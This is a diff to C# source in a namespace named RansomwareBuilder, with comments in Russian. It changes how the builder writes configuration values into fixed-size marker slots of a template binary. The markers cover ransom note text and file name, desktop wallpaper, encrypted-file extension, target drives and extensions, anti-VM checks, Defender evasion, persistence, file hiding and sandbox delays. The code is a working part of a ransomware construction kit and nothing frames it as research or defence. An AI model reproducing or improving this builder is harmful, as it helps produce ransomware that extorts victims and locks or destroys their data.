@@ -771,6 +771,25 @@ namespace RansomwareBuilder
     byte[] markerBytes = Encoding.UTF8.GetBytes(marker);
     byte[] valueBytes = Encoding.UTF8.GetBytes(value + "\0");
     
+    // ============================================================
+    // ЖЕСТКИЕ РАЗМЕРЫ БУФЕРОВ (из template.cpp)
+    // ============================================================
+    int maxLen = 256;
+    if (marker.Contains("WALLPAPER_BASE64")) maxLen = 16384;
+    else if (marker.Contains("NOTE_CONTENT")) maxLen = 4096;
+    else if (marker.Contains("EXTS")) maxLen = 2048;
+    else if (marker.Contains("EXCLUDE") || marker.Contains("INCLUDE")) maxLen = 1024;
+    else if (marker.Contains("DRIVES")) maxLen = 512;
+    else if (marker.Contains("NOTE_NAME") || marker.Contains("FAKE_NAME")) maxLen = 64;
+    else if (marker.Contains("ENC_EXT") || marker.Contains("WALLPAPER_EXT")) maxLen = 32;
+    else if (marker.Contains("ALGO") || marker.Contains("ENABLED") || 
+             marker.Contains("ANTI_VM") || marker.Contains("DEFENDER") ||
+             marker.Contains("PERSISTENCE") || marker.Contains("HIDE_FILES") ||
+             marker.Contains("SANDBOX_DELAY") || marker.Contains("DELAY"))
+    {
+        maxLen = 8; // Для чисел (0 или 1 + нуль-терминатор)
+    }
+    
     for (int i = 0; i < data.Length - markerBytes.Length; i++)
     {
         bool found = true;
@@ -781,50 +800,12 @@ namespace RansomwareBuilder
         if (found)
         {
             int start = i + markerBytes.Length;
-            int maxLen = 0;
             
-            // ============================================================
-            // Ищем следующий маркер (по символу '|' в начале)
-            // ============================================================
-            for (int k = start; k < data.Length; k++)
-            {
-                // Если нашли символ '|' — это может быть начало маркера
-                if (data[k] == '|')
-                {
-                    // Проверяем, что это действительно маркер (не часть данных)
-                    // Маркеры всегда начинаются с '|' и заканчиваются '|'
-                    // Например: |DRIVES|, |EXTS|, |ENC_EXT|
-                    int end = k + 1;
-                    while (end < data.Length && data[end] != '|')
-                        end++;
-                    if (end < data.Length && data[end] == '|' && end - k > 2)
-                    {
-                        // Это маркер
-                        break;
-                    }
-                }
-                maxLen++;
-            }
-            
-            // ============================================================
-            // ЖЕСТКИЕ РАЗМЕРЫ (если не нашли следующий маркер)
-            // ============================================================
-            if (maxLen == 0 || maxLen > 16384)
-            {
-                if (marker.Contains("WALLPAPER_BASE64")) maxLen = 16384;
-                else if (marker.Contains("NOTE_CONTENT")) maxLen = 4096;
-                else if (marker.Contains("EXTS")) maxLen = 2048;
-                else if (marker.Contains("EXCLUDE") || marker.Contains("INCLUDE")) maxLen = 1024;
-                else if (marker.Contains("DRIVES")) maxLen = 512;
-                else if (marker.Contains("NOTE_NAME") || marker.Contains("FAKE_NAME")) maxLen = 64;
-                else if (marker.Contains("ENC_EXT") || marker.Contains("WALLPAPER_EXT")) maxLen = 32;
-                else maxLen = 256;
-            }
-            
+            // Копируем значение
             int copyLen = Math.Min(valueBytes.Length, maxLen);
             Array.Copy(valueBytes, 0, data, start, copyLen);
             
-            // Обнуляем остаток
+            // Обнуляем остаток буфера
             for (int k = start + copyLen; k < start + maxLen; k++)
                 data[k] = 0;
             
